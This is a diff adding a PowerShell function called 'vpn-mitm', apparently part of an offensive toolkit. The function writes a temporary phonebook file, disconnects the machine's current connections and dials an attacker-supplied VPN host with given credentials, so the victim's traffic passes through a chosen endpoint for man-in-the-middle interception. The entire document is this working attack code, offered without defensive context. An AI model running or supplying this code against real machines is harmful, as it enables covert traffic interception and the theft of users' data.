@@ -1,0 +1,31 @@
+function vpn-mitm{
+
+    param(
+        [Parameter(Mandatory)]
+        [String] $pbk_name,
+        [Parameter(Mandatory)]
+        [String] $vpn_host,
+        [Parameter(Mandatory)]
+        [String] $username,
+        [Parameter(Mandatory)]
+        [String] $password
+    )
+
+
+    $file = $env:TEMP + "\" + (Get-Random(1000000)).ToString() + ".pbk"
+
+    Write-Output "[$pbk_name]" | Out-File -Encoding ascii $file
+    Write-Output "" | Out-File -Encoding ascii $file -Append
+    Write-Output "MEDIA=rastapi" | Out-File -Encoding ascii $file -Append
+    Write-Output "Port=VPN4-0" | Out-File -Encoding ascii $file -Append
+    Write-Output "DEVICE=vpn" | Out-File -Encoding ascii $file -Append
+
+    $file
+
+    rasdial.exe /disconnect
+    rasdial.exe $pbk_name $username $password /PHONE:$vpn_host /PHONEBOOK:$file
+    rasdial.exe
+
+    Remove-Item $file
+
+}
